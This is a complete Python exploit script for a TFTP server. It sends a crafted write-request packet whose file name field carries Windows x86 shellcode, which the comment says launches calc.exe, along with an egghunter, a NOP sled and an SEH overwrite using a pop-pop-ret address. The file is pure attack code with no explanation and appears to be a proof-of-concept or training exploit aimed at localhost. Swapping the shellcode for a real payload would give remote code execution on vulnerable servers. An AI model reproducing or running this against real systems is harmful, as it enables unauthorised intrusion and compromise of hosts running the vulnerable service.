import struct
import socket

TARGET_IP = "127.0.0.1"
TARGET_PORT = 69
target = (TARGET_IP, TARGET_PORT) 

egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x63\x30\x64\x33\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"

#calc.exe W10 x86
shellcode = b"\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF5\x0F\xB7\x54\x51\xFE\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\x96\xFF\xD7"  
CRASH_LEN = 1600  # change me
OFFSET = 1264

payload = b"c0d3c0d3" # 8 bytes
payload += shellcode 
payload += b"A" * (OFFSET - 100 - 8 - len(shellcode))
payload += b"\x90" * (100 - len(egghunter))
payload += egghunter
payload += struct.pack("<I",0x9aeb9090) #nseh - jump -100
payload += struct.pack("<I",0x00409605) #seh PPR
payload += b"D" * (CRASH_LEN - len(payload))


mode = b"netascii"
packet = b"\x00\x02" + payload + b"\x00" + mode + b"\x00"

s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.sendto(packet, (TARGET_IP, TARGET_PORT))
